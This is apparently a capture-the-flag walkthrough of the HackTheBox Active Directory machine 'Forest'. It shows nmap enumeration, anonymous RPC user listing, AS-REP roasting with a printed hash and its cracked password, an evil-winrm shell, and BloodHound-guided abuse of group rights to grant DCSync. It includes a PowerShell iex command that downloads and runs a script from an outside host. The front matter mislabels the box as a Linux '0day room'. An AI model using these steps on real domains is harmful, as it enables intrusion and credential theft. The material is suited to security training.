---
title: Forest
date: 2025-05-25
description: Detailed walkthrough of the 0day room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
categories:
  - HackTheBox
  - HackTheBox/Linux
image: images/0day/banner.jpeg
---

# Forest

| Title       | [Forest](https://app.hackthebox.com/machines/212)                                                    |
| ----------- | ---------------------------------------------------------------------------------------------------- |
| Description |                                                                                                      |
| Difficulty  | Easy                                                                                                 |
| Maker       | [egre55 &](https://app.hackthebox.com/users/1190) [mrb3n8132](https://app.hackthebox.com/users/2984) |

## Enumeration

### Nmap

```bash
└─$ cat nmap/tcp_default.nmap
# Nmap 7.95 scan initiated Wed May 21 21:37:10 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.10.161
Increasing send delay for 10.10.10.161 from 0 to 5 due to 2277 out of 5692 dropped probes since last increase.
Warning: 10.10.10.161 giving up on port because retransmission cap hit (6).
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.11s latency).
Not shown: 65479 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
53/tcp    open     domain       (generic dns response: SERVFAIL)
| fingerprint-strings:
|   DNS-SD-TCP:
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp    open     kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-22 01:44:17Z)
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3551/tcp  filtered apcupsd
5985/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6486/tcp  filtered sun-sr-iiops
8013/tcp  filtered unknown
8106/tcp  filtered unknown
9389/tcp  open     mc-nmf       .NET Message Framing
12484/tcp filtered unknown
13137/tcp filtered unknown
13769/tcp filtered unknown
15319/tcp filtered unknown
16444/tcp filtered overnet
19337/tcp filtered unknown
21307/tcp filtered unknown
24598/tcp filtered unknown
26381/tcp filtered unknown
27521/tcp filtered unknown
27566/tcp filtered unknown
32934/tcp filtered unknown
33020/tcp filtered unknown
34910/tcp filtered unknown
35974/tcp filtered unknown
37476/tcp filtered unknown
39913/tcp filtered unknown
40607/tcp filtered unknown
43902/tcp filtered unknown
45482/tcp filtered unknown
47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47635/tcp filtered unknown
48821/tcp filtered unknown
48936/tcp filtered unknown
49664/tcp open     msrpc        Microsoft Windows RPC
49665/tcp open     msrpc        Microsoft Windows RPC
49666/tcp open     msrpc        Microsoft Windows RPC
49668/tcp open     msrpc        Microsoft Windows RPC
49671/tcp open     msrpc        Microsoft Windows RPC
49676/tcp open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open     msrpc        Microsoft Windows RPC
49684/tcp open     msrpc        Microsoft Windows RPC
49703/tcp open     msrpc        Microsoft Windows RPC
51406/tcp filtered unknown
52517/tcp filtered unknown
55858/tcp filtered unknown
58524/tcp filtered unknown
61800/tcp filtered unknown
65215/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=5/21%Time=682E7FEA%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-05-21T18:45:09-07:00
| smb2-time:
|   date: 2025-05-22T01:45:08
|_  start_date: 2025-05-22T01:41:01
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m47s, deviation: 4h02m30s, median: 6m46s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 21 21:38:34 2025 -- 1 IP address (1 host up) scanned in 83.73 seconds
```

From the results of nmap, we can see this box is active directory machine and there is no web server, on top of that there is smb and ldap ports are open, let's try to enumerate those!

### SMB

There is nothing on smb

```bash
└─$ smbclient -L \\\\10.10.10.161
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Next, we can try to enumerate LDAP

### rpcclient

We can use rpcclient in order to get all the users from the domain

```bash
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdom
enumdomains    enumdomgroups  enumdomusers
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
...
```

and make a users.txt file

```bash
└─$ cat users.txt
Administrator
Guest
krbtgt
DefaultAccount
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

As we have usernames, we can use `GetNPUsers`.

## User Flag

### GetNPUsers

Impacket’s GetNPUsers.py will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline.

```bash
└─$ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -format hashcat
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:d9ad83d1d374c33acc20d4f20a34bfa9$49584e7b68a9e92522893ea3c9d07cc210568646a2367ca7bccf142db2d3a7269cb948280232d69bd9a4699732b3c922c8651a2be9953a5eeb118ad9f1ed09a333080b13d1cb8ea8091fbaf0d7b7a587a9b4e24ea1f863b0a1df6464193810dccab58e1bb81877460deccc3aaf7a2e4495bd1a4c5deb67dc71b85f6369efe1b6aeda659b1675695b0ea54fcb379865748c9b19b60082ab5724ea6f42ec392734cb6c680255803a7896f44179a40a949962a9358d200cd36d4178924d1360195f3765ad2dca9365d24d22d53459c151d991a7c33acbf774fc60d9b2b0c477fef9a84bcae20137
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We found `svc-alfresco`'s hash. Saving it to `svc-alfresco.hash` and cracking using john.

| User         | Pass    |
| ------------ | ------- |
| svc-alfresco | s3rvice |

Using this creds, let's try to get the shell using `evil-winrm`

```bash
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
cd Desk*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
ls*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/21/2025   6:41 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
dcaf8d29b1099809891f4cffbb3021e6
```

> User Flag: `dcaf8d29b1099809891f4cffbb3021e6`

## Root Flag

As we have all the credentials for user, let's feed it to bloodhound and get something out of it! Get all bloodhound data using

- `bloodhound-python -c All -u svc-alfresco -p 's3rvice' -d htb.local -ns 10.10.10.161 --zip`
  In bloodhound, we will mark `svc-alfresco` as owned in from the left tab, we will select `shortest path to high value target` we will see this path.
  ![[Pasted image 20250521224449.png]]
  I have modified the graph a bit to make it clear. Just to make it clear the chain is like this
  `svc-alfresco` -is a member of > `service account` -is a member of > `Privileged IT Account` -is a memberof > `Account Operators` -GenericAll> `Exchange Windows Permissions` -WriteDacl> `HTB.LOCAL`.
  So we can add ourself to `Exchange Windows Permission` group using
- `net group "Exchange Windows Permissions" "svc-alfresco" /add /domain`
- check using `net group 'Exchange Windows Permissions'`
  Now, in order to abuse WriteDacl, this is the documentation we got from bloodhound.
  To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.

```
You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL:

Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```

In order to use this, we have to upload powerview to windows.

```
iex(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Powerview.ps1')
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
```
